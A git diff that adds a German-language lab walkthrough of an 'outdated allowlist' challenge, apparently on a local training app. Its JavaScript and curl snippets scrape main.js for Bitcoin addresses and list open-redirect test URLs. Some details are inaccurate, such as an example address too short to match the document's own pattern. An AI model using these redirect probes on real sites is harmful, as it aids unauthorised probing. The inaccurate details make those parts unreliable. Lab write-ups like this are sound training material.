@@ -750,6 +750,216 @@ function safeRender(userInput) {
 
 ---
 
+## 7. Outdated Allowlist - BTC Address Discovery via Angular Routing
+
+### 📝 Beschreibung
+Durch die Analyse der Angular-Routen können veraltete Cryptocurrency-Adressen entdeckt werden, die nicht mehr beworben werden, aber noch in der Allowlist stehen.
+
+### 🔍 Schritt 1: Angular Route Discovery aus Abschnitt 4
+
+```javascript
+// Verwende die Route Discovery Methoden aus Abschnitt 4
+fetch('http://localhost:3000/main.js')
+.then(response => response.text())
+.then(code => {
+    // Suche speziell nach Crypto-bezogenen Routen
+    const cryptoPatterns = [
+        /btc/gi,
+        /bitcoin/gi,
+        /crypto/gi,
+        /wallet/gi,
+        /donation/gi,
+        /redirect/gi
+    ];
+    
+    cryptoPatterns.forEach((pattern, index) => {
+        const matches = code.match(pattern);
+        if (matches) {
+            console.log(`🔍 Crypto Pattern ${index}:`, [...new Set(matches)]);
+        }
+    });
+});
+```
+
+### 🔍 Schritt 2: Redirect-Parameter analysieren
+
+```javascript
+// Suche nach redirect-fähigen Routen
+function findRedirectRoutes() {
+    // Typische Redirect-Parameter in Angular
+    const redirectParams = [
+        'redirect',
+        'to',
+        'url',
+        'target',
+        'destination'
+    ];
+    
+    // Teste verschiedene Kombinationen
+    const testUrls = [
+        '/#/redirect?to=',
+        '/#/redirect?url=',
+        '/#/?redirect=',
+        '/#/wallet?to=',
+        '/#/donation?to='
+    ];
+    
+    console.log('🧪 Test these redirect URLs:');
+    testUrls.forEach(url => {
+        console.log(`${url}[CRYPTO_ADDRESS]`);
+    });
+}
+```
+
+### 🔍 Schritt 3: BTC Address Discovery
+
+```javascript
+// Automatische BTC-Adresse Entdeckung
+function discoverBTCAddresses() {
+    // Bitcoin-Adressen haben spezifische Formate
+    const btcPatterns = [
+        /1[A-HJ-NP-Z0-9]{25,34}/g,    // Legacy (P2PKH)
+        /3[A-HJ-NP-Z0-9]{25,34}/g,    // SegWit (P2SH)  
+        /bc1[A-HJ-NP-Z0-9]{25,62}/g   // Bech32
+    ];
+    
+    // Durchsuche JavaScript-Code nach BTC-Adressen
+    fetch('http://localhost:3000/main.js')
+    .then(response => response.text())
+    .then(code => {
+        console.log('🔍 Searching for Bitcoin addresses...');
+        
+        btcPatterns.forEach((pattern, index) => {
+            const matches = code.match(pattern);
+            if (matches) {
+                console.log(`₿ Bitcoin addresses found (Pattern ${index}):`, matches);
+                
+                // Teste jede gefundene Adresse
+                matches.forEach(address => {
+                    testRedirectToAddress(address);
+                });
+            }
+        });
+    });
+}
+
+// Teste Redirect zu BTC-Adresse
+function testRedirectToAddress(btcAddress) {
+    const redirectUrls = [
+        `/#/redirect?to=${btcAddress}`,
+        `/#/redirect?url=${btcAddress}`,
+        `/#/?redirect=${btcAddress}`,
+        `/#/donation?to=${btcAddress}`
+    ];
+    
+    console.log(`🧪 Testing redirects for: ${btcAddress}`);
+    redirectUrls.forEach(url => {
+        console.log(`🔗 Try: http://localhost:3000${url}`);
+    });
+}
+```
+
+### 🛠️ Manuelle Methode
+
+```bash
+# 1. Finde alle Routen mit redirect-Parametern
+curl -s http://localhost:3000/main.js | grep -i "redirect\|to\|url"
+
+# 2. Suche nach Bitcoin-Adressen im JavaScript
+curl -s http://localhost:3000/main.js | grep -o -E "1[A-HJ-NP-Z0-9]{25,34}|3[A-HJ-NP-Z0-9]{25,34}|bc1[A-HJ-NP-Z0-9]{25,62}"
+
+# 3. Teste gefundene Adressen manuell
+# Beispiel für typische BTC-Adresse:
+echo "http://localhost:3000/#/redirect?to=1AbKfgvw9psQ41NuW8w"
+```
+
+### 🔍 Exploit Workflow
+
+```javascript
+// Vollständiger Workflow für BTC Address Discovery
+async function exploitOutdatedAllowlist() {
+    console.log('🕵️ Starting Outdated Allowlist Exploit...');
+    
+    try {
+        // 1. Lade main.js
+        const response = await fetch('http://localhost:3000/main.js');
+        const jsCode = await response.text();
+        
+        // 2. Suche nach Bitcoin-Adressen
+        const btcRegex = /1[A-HJ-NP-Z0-9]{25,34}/g;
+        const foundAddresses = jsCode.match(btcRegex) || [];
+        
+        console.log(`₿ Found ${foundAddresses.length} potential BTC addresses:`);
+        foundAddresses.forEach((addr, index) => {
+            console.log(`${index + 1}. ${addr}`);
+        });
+        
+        // 3. Teste Redirect-Parameter
+        const redirectParams = ['to', 'url', 'redirect', 'target'];
+        const baseUrls = ['/#/redirect', '/#/', '/#/donation'];
+        
+        for (const address of foundAddresses) {
+            for (const baseUrl of baseUrls) {
+                for (const param of redirectParams) {
+                    const testUrl = `${baseUrl}?${param}=${address}`;
+                    console.log(`🧪 Test: http://localhost:3000${testUrl}`);
+                    
+                    // In echter Anwendung würdest du hier eine Anfrage senden
+                    // und prüfen, ob der Redirect funktioniert
+                }
+            }
+        }
+        
+        console.log('✅ Exploit completed! Check URLs manually.');
+        
+    } catch (error) {
+        console.error('❌ Error:', error);
+    }
+}
+
+// Starte den Exploit
+exploitOutdatedAllowlist();
+```
+
+### 💡 Warum funktioniert dieser Exploit?
+
+1. **Veraltete Allowlist**: Alte BTC-Adressen sind noch in der Redirect-Allowlist
+2. **Angular Router Schwäche**: Parameter-basierte Redirects ohne strikte Validierung
+3. **Information Disclosure**: BTC-Adressen im Client-Code gespeichert
+4. **Legacy Code**: Nicht entfernte, aber inaktive Donation-Links
+
+### 🔍 Typische gefundene BTC-Adressen
+
+```javascript
+// Beispiele für BTC-Adressen die typischerweise gefunden werden
+const exampleAddresses = [
+    "1AbKfgvw9psQ41NuW8w",      // Beispiel Legacy-Adresse
+    "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy", // SegWit-Adresse
+    "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"  // Bech32-Adresse
+];
+
+// Teste diese in verschiedenen Redirect-Szenarien
+exampleAddresses.forEach(addr => {
+    console.log(`🔗 http://localhost:3000/#/redirect?to=${addr}`);
+    console.log(`🔗 http://localhost:3000/#/?redirect=${addr}`);
+});
+```
+
+### 🚨 Sicherheitslücke
+
+- **Schwachstelle**: Unvollständige Allowlist-Wartung
+- **Impact**: Information Disclosure von Crypto-Adressen
+- **CVSS**: Medium (Sensitive Information Exposure)
+
+### 🛡️ Gegenmaßnahmen
+
+1. **Allowlist Maintenance**: Regelmäßige Überprüfung und Bereinigung
+2. **Redirect Validation**: Strikte Whitelist für erlaubte Redirect-Ziele
+3. **Code Cleanup**: Entfernung alter/unused Routes und Adressen
+4. **Parameter Validation**: Eingabe-Validierung für alle Router-Parameter
+
+---
+
 ## 📚 Zusammenfassung der Schwachstellen
 
 1. **SQL Injection**: Fehlende Input-Validierung
@@ -758,6 +968,7 @@ function safeRender(userInput) {
 4. **Access Control**: Versteckte Admin-Bereiche ohne Authentifizierung
 5. **File Upload**: Unzureichende Dateivalidierung
 6. **DOM XSS**: Unsichere DOM-Manipulation und fehlende Sanitization
+7. **Outdated Allowlist**: Veraltete Crypto-Adressen in Redirect-Allowlist
 
 ## 🛡️ Empfohlene Gegenmaßnahmen
 
@@ -767,4 +978,5 @@ function safeRender(userInput) {
 4. **File Validation**: MIME-Type und Magic Bytes prüfen
 5. **Security Headers**: CSP, X-Frame-Options, etc. implementieren
 6. **XSS Prevention**: Input-Sanitization, textContent statt innerHTML, DOMPurify
+7. **Allowlist Management**: Regelmäßige Bereinigung veralteter Redirect-Ziele
 
